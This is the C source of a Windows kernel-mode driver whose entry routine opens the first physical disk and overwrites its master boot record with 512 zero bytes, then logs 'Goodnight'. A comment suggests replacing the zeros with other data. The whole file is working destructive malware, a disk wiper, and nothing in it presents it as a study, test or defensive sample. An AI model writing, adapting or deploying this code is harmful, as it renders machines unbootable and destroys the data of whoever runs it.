#include <ntifs.h>
#include <windef.h>

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
	UNREFERENCED_PARAMETER(DriverObject);
	UNREFERENCED_PARAMETER(RegistryPath);
	UNICODE_STRING deviceName;
	OBJECT_ATTRIBUTES objectAttributes;
	HANDLE handle;
	IO_STATUS_BLOCK ioStatusBlock;
	NTSTATUS status;
  //Change if you wanna overwrite with something else then null
	UCHAR zeroMBRData[512] = { 0 };
	RtlInitUnicodeString(&deviceName, L"\\Device\\Harddisk0\\Partition0");
	InitializeObjectAttributes(&objectAttributes, &deviceName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
	status = ZwCreateFile(&handle, GENERIC_WRITE, &objectAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if (NT_SUCCESS(status)) {
		status = ZwWriteFile(handle, NULL, NULL, NULL, &ioStatusBlock, zeroMBRData, 512, NULL, NULL);
		ZwClose(handle);
		if (NT_SUCCESS(status)) {
			KdPrint(("Goodnight"));
		}
	}
	return STATUS_SUCCESS;
}
